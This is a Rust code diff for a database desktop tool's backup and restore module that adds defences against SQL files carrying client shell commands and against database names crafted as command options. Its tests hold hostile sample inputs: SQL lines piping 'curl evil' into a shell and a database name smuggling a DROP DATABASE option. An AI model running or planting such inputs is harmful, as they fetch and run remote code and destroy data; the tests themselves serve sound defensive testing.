@@ -18,9 +18,15 @@ use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
 use tokio::process::{Child, Command};
 use tokio::sync::oneshot;
 
-use super::cli::{Invocation, mysql_connection, pg_connection, reach, spawn, stopped};
+use super::cli::{
+    Invocation, mysql_connection, not_an_option, pg_connection, reach, spawn, stopped,
+};
 use super::{AppState, lock};
 use crate::error::{CommandError, CommandResult};
+
+mod scan;
+
+use scan::{Client, client_commands, is_restrict_line};
 
 /// How a PostgreSQL backup is written; MySQL's is always SQL.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
@@ -50,6 +56,10 @@ pub struct RestoreRequest {
     /// Drops the archive's objects before creating them again (`pg_restore --clean`).
     #[serde(default)]
     pub clean: bool,
+    /// The user has seen the client commands of a SQL file (`\!`, `system`…) and runs
+    /// them; otherwise a file with any is refused, and the client runs restricted.
+    #[serde(default)]
+    pub allow_client_commands: bool,
 }
 
 /// How far a backup or restore is: tables done of `total`, or bytes of the file sent.
@@ -174,7 +184,10 @@ fn backup_invocation(
             if request.structure_only {
                 args.push("--no-data".to_owned());
             }
-            args.push(config.database.clone());
+            // The database is mysqldump's only positional argument: after `--`, and never
+            // one that looks like an option.
+            let database = not_an_option("database", &config.database)?;
+            args.extend(["--".to_owned(), database.to_owned()]);
             Ok(("mysqldump", (args, env)))
         }
         other => Err(CommandError::new(
@@ -192,16 +205,93 @@ async fn is_archive(path: &Path) -> std::io::Result<bool> {
     Ok(&head[..n] == b"PGDMP")
 }
 
-/// A line of a file sent as it is.
-fn as_it_is(line: &[u8]) -> Cow<'_, [u8]> {
-    Cow::Borrowed(line)
+/// A line of a SQL file for psql, without `pg_dump`'s own `\restrict` and `\unrestrict`:
+/// psql restricted by the app refuses any other backslash command, those included, and an
+/// older psql knows neither.
+fn without_restrict(line: &[u8]) -> Cow<'_, [u8]> {
+    Cow::Borrowed(if is_restrict_line(line) { &[] } else { line })
 }
 
+/// What filters each line of a file sent to a client.
+type Filter = fn(&[u8]) -> Cow<'_, [u8]>;
+
 /// How a file is restored: a tool that reads it, or a client whose input it is, each line
-/// through a filter.
+/// through a filter, after a prelude of the app's own.
 enum Restore {
     Reads(&'static str, Invocation),
-    Input(&'static str, Invocation, fn(&[u8]) -> Cow<'_, [u8]>),
+    Input(&'static str, Invocation, Filter, Vec<u8>),
+}
+
+/// Whether the file restored through `client` must run restricted: always, unless the user
+/// has seen its client commands and runs them. A file with any, not yet seen, is refused
+/// with them (`client_commands`), for the user to judge.
+async fn restricted(request: &RestoreRequest, client: Client) -> CommandResult<bool> {
+    if request.allow_client_commands {
+        return Ok(false);
+    }
+    let path = request.path.clone();
+    let found = tokio::task::spawn_blocking(move || {
+        let file = std::fs::File::open(&path)?;
+        client_commands(std::io::BufReader::with_capacity(64 * 1024, file), client)
+    })
+    .await
+    .map_err(|e| CommandError::new("io", e.to_string()))?
+    .map_err(|e| CommandError::new("io", format!("{}: {e}", request.path.display())))?;
+    if found.is_empty() {
+        return Ok(true);
+    }
+    let lines: Vec<String> = found
+        .iter()
+        .map(|f| format!("{}: {}", f.line, f.text))
+        .collect();
+    Err(CommandError::new("client_commands", lines.join("\n")))
+}
+
+/// What `program --help`-like `args` print, empty when it cannot run.
+async fn help_of(program: &str, args: &[&str]) -> String {
+    let mut command = Command::new(program);
+    #[cfg(windows)]
+    command.creation_flags(0x0800_0000); // CREATE_NO_WINDOW: no console flashes up.
+    command
+        .args(args)
+        .stdin(std::process::Stdio::null())
+        .output()
+        .await
+        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
+        .unwrap_or_default()
+}
+
+/// The prelude that restricts psql to no backslash command for the rest of its input, when
+/// its version has `\restrict` (13.22, 14.19, 15.14, 16.10, 17.6 and later); the key is
+/// random, so the file cannot lift it.
+fn psql_restriction(help: &str) -> Vec<u8> {
+    if help.contains("\\restrict") {
+        format!("\\restrict {}\n", uuid::Uuid::new_v4().simple()).into_bytes()
+    } else {
+        Vec::new()
+    }
+}
+
+/// The options that take the mysql client's commands away. `--binary-mode`, which every
+/// MySQL and MariaDB client knows, refuses all but `charset` and `delimiter` in a file; then
+/// MySQL's `--skip-system-command` (8.0.40 and later) and MariaDB's `--sandbox` (10.5.25
+/// and later), where the client lists them in its `--help`.
+fn mysql_restriction(help: &str) -> Vec<String> {
+    let listed = |option: &str| {
+        help.lines().any(|l| {
+            l.trim_start()
+                .strip_prefix(option)
+                .is_some_and(|rest| rest.is_empty() || rest.starts_with(char::is_whitespace))
+        })
+    };
+    let mut options = vec!["--binary-mode".to_owned()];
+    if listed("--system-command") {
+        options.push("--skip-system-command".to_owned());
+    }
+    if listed("--sandbox") {
+        options.push("--sandbox".to_owned());
+    }
+    options
 }
 
 async fn restore_invocation(
@@ -226,6 +316,11 @@ async fn restore_invocation(
                 args.push(file);
                 Ok(Restore::Reads("pg_restore", (args, env)))
             } else {
+                let prelude = if restricted(request, Client::Psql).await? {
+                    psql_restriction(&help_of("psql", &["--help=commands"]).await)
+                } else {
+                    Vec::new()
+                };
                 // All or nothing: the first error rolls the file back.
                 args.extend(
                     [
@@ -238,16 +333,29 @@ async fn restore_invocation(
                     ]
                     .map(str::to_owned),
                 );
-                Ok(Restore::Input("psql", (args, env), as_it_is))
+                Ok(Restore::Input(
+                    "psql",
+                    (args, env),
+                    without_restrict,
+                    prelude,
+                ))
             }
         }
         DriverKind::MySql => {
             let (mut args, env) = mysql_connection(config, host, port);
             args.push("--default-character-set=utf8mb4".to_owned());
-            if !config.database.is_empty() {
-                args.push(config.database.clone());
+            if restricted(request, Client::Mysql).await? {
+                args.extend(mysql_restriction(&help_of("mysql", &["--help"]).await));
             }
-            Ok(Restore::Input("mysql", (args, env), without_definer))
+            if !config.database.is_empty() {
+                args.push(format!("--database={}", config.database));
+            }
+            Ok(Restore::Input(
+                "mysql",
+                (args, env),
+                without_definer,
+                Vec::new(),
+            ))
         }
         other => Err(CommandError::new(
             "unsupported",
@@ -348,14 +456,14 @@ fn without_definer(line: &[u8]) -> Cow<'_, [u8]> {
     Cow::Owned(out)
 }
 
-/// Sends `path` to the client's input, a line at a time through `filter`, reporting the
-/// bytes read every so often. A file that cannot be read to its end says why on the
-/// returned receiver, and the input stays open: closed, the client would take the part it
-/// got for the whole file (`psql --single-transaction` would commit it).
+/// Sends `prelude`, then `path` to the client's input, a line at a time through `filter`,
+/// reporting the bytes read every so often. A file that cannot be read to its end says why
+/// on the returned receiver, and the input stays open: closed, the client would take the
+/// part it got for the whole file (`psql --single-transaction` would commit it).
 async fn send_file(
     child: &mut Child,
     path: PathBuf,
-    filter: fn(&[u8]) -> Cow<'_, [u8]>,
+    (filter, prelude): (Filter, Vec<u8>),
     events: Channel<BackupEvent>,
 ) -> CommandResult<(
     tauri::async_runtime::JoinHandle<()>,
@@ -371,6 +479,9 @@ async fn send_file(
     };
     let (failed, read_failed) = oneshot::channel();
     let sending = tauri::async_runtime::spawn(async move {
+        if stdin.write_all(&prelude).await.is_err() {
+            return;
+        }
         let mut line = Vec::new();
         let mut sent = 0;
         let mut told = Instant::now();
@@ -558,11 +669,15 @@ pub async fn restore_database(
                         listing.map(|o| archive_tables(&String::from_utf8_lossy(&o.stdout)));
                     (program, spawn(program, invocation, false)?, total, None, None)
                 }
-                Restore::Input(program, invocation, filter) => {
+                Restore::Input(program, invocation, filter, prelude) => {
                     let mut child = spawn(program, invocation, true)?;
-                    let (sending, read_failed) =
-                        send_file(&mut child, request.path.clone(), filter, on_event.clone())
-                            .await?;
+                    let (sending, read_failed) = send_file(
+                        &mut child,
+                        request.path.clone(),
+                        (filter, prelude),
+                        on_event.clone(),
+                    )
+                    .await?;
                     (program, child, None, Some(sending), Some(read_failed))
                 }
             };
@@ -672,7 +787,7 @@ mod tests {
             backup_invocation(&config, "db", Some(5433), &request).unwrap();
         assert_eq!(program, "pg_dump");
         for pair in [
-            ["-d", "shop"],
+            ["-d", "dbname='shop'"],
             ["-p", "5433"],
             ["--schema", "sales"],
             ["--file", "/tmp/shop.dump"],
@@ -687,10 +802,17 @@ mod tests {
         config.driver = DriverKind::MySql;
         let (program, (args, env)) = backup_invocation(&config, "db", None, &request).unwrap();
         assert_eq!(program, "mysqldump");
-        assert_eq!(args.last().map(String::as_str), Some("shop"));
+        assert!(
+            args.ends_with(&["--".to_owned(), "shop".to_owned()]),
+            "{args:?}"
+        );
         assert!(args.contains(&"--result-file=/tmp/shop.dump".to_owned()));
         assert!(args.contains(&"--no-data".to_owned()));
         assert!(env.contains(&("MYSQL_PWD", "s3cret".to_owned())));
+        // A database named like an option is refused.
+        config.database = "--init-command=DROP DATABASE shop".to_owned();
+        assert!(backup_invocation(&config, "db", None, &request).is_err());
+        config.database = "shop".to_owned();
 
         config.database = String::new();
         assert!(backup_invocation(&config, "db", None, &request).is_err());
@@ -710,6 +832,7 @@ mod tests {
         let request = |path: &Path, clean| RestoreRequest {
             path: path.to_owned(),
             clean,
+            allow_client_commands: false,
         };
         let Restore::Reads(program, (args, _)) =
             restore_invocation(&config, "db", None, &request(&archive, true))
@@ -721,7 +844,7 @@ mod tests {
         assert_eq!(program, "pg_restore");
         assert!(args.contains(&"--clean".to_owned()));
         assert_eq!(args.last(), Some(&archive.display().to_string()));
-        let Restore::Input(program, (args, _), _) =
+        let Restore::Input(program, (args, _), _, _) =
             restore_invocation(&config, "db", None, &request(&sql, false))
                 .await
                 .unwrap()
@@ -731,12 +854,90 @@ mod tests {
         assert_eq!(program, "psql");
         assert!(args.contains(&"--single-transaction".to_owned()));
         config.driver = DriverKind::MySql;
-        assert!(matches!(
+        let Restore::Input("mysql", (args, _), _, _) =
             restore_invocation(&config, "db", None, &request(&sql, false))
                 .await
-                .unwrap(),
-            Restore::Input("mysql", _, _)
-        ));
+                .unwrap()
+        else {
+            panic!("SQL goes to mysql");
+        };
+        assert!(args.contains(&"--binary-mode".to_owned()), "{args:?}");
+    }
+
+    /// A SQL file with commands for the client itself is refused with them, and runs
+    /// unrestricted only once the user has seen them.
+    #[tokio::test]
+    async fn refuses_a_file_with_client_commands_until_the_user_has_seen_them() {
+        let dir = tempfile::tempdir().unwrap();
+        let sql = dir.path().join("evil.sql");
+        std::fs::write(&sql, "CREATE TABLE t (id int);\n\\! curl evil | sh\n").unwrap();
+        let mut config = ConnectionConfig::new(DriverKind::Postgres);
+        config.database = "shop".to_owned();
+        let mut request = RestoreRequest {
+            path: sql.clone(),
+            clean: false,
+            allow_client_commands: false,
+        };
+        let Err(error) = restore_invocation(&config, "db", None, &request).await else {
+            panic!("a file with \\! is refused");
+        };
+        let json = serde_json::to_value(&error).unwrap();
+        assert_eq!(json["kind"], "client_commands");
+        assert_eq!(json["message"], "2: \\! curl evil | sh");
+        request.allow_client_commands = true;
+        let Restore::Input("psql", _, _, prelude) =
+            restore_invocation(&config, "db", None, &request)
+                .await
+                .unwrap()
+        else {
+            panic!("seen, the file goes to psql");
+        };
+        assert!(prelude.is_empty());
+
+        std::fs::write(&sql, "SELECT 1;\nsystem curl evil | sh\n").unwrap();
+        config.driver = DriverKind::MySql;
+        request.allow_client_commands = false;
+        assert!(
+            restore_invocation(&config, "db", None, &request)
+                .await
+                .is_err()
+        );
+        request.allow_client_commands = true;
+        let Restore::Input("mysql", (args, _), _, _) =
+            restore_invocation(&config, "db", None, &request)
+                .await
+                .unwrap()
+        else {
+            panic!("seen, the file goes to mysql");
+        };
+        assert!(!args.contains(&"--binary-mode".to_owned()));
+    }
+
+    #[test]
+    fn restricts_the_clients_that_can_be() {
+        let prelude = psql_restriction("  \\restrict RESTRICT_KEY\n  \\unrestrict RESTRICT_KEY\n");
+        let prelude = String::from_utf8(prelude).unwrap();
+        let key = prelude.strip_prefix("\\restrict ").unwrap().trim_end();
+        assert!(key.len() >= 32 && key.chars().all(|c| c.is_ascii_alphanumeric()));
+        assert_ne!(
+            psql_restriction("\\restrict K"),
+            psql_restriction("\\restrict K")
+        );
+        assert!(psql_restriction("  \\q  quit psql\n").is_empty());
+
+        let mysql = "  --binary-mode       By default, ASCII '\\0' is disallowed\n\
+                     expired password sandbox mode.\n\
+                     \x20 --system-command    Enable (by default) or disable the system mysql command.\n";
+        assert_eq!(
+            mysql_restriction(mysql),
+            ["--binary-mode", "--skip-system-command"]
+        );
+        let mariadb = "  --sandbox           Disallow commands that access the file system\n";
+        assert_eq!(mysql_restriction(mariadb), ["--binary-mode", "--sandbox"]);
+        assert_eq!(mysql_restriction(""), ["--binary-mode"]);
+
+        assert_eq!(&*without_restrict(b"\\restrict abc\n"), b"");
+        assert_eq!(&*without_restrict(b"SELECT 1;\n"), b"SELECT 1;\n");
     }
 
     /// The events sent on a channel, as JSON.
@@ -858,8 +1059,9 @@ mod tests {
         let restore = RestoreRequest {
             path: file.clone(),
             clean: false,
+            allow_client_commands: false,
         };
-        let Restore::Input(program, invocation, filter) =
+        let Restore::Input(program, invocation, filter, prelude) =
             restore_invocation(&config, "127.0.0.1", Some(53306), &restore)
                 .await
                 .unwrap()
@@ -868,7 +1070,7 @@ mod tests {
         };
         let (channel, events) = recorder();
         let mut child = spawn(program, invocation, true).unwrap();
-        let (sending, _) = send_file(&mut child, file.clone(), filter, channel.clone())
+        let (sending, _) = send_file(&mut child, file.clone(), (filter, prelude), channel.clone())
             .await
             .unwrap();
         let (_stop, cancel) = oneshot::channel();
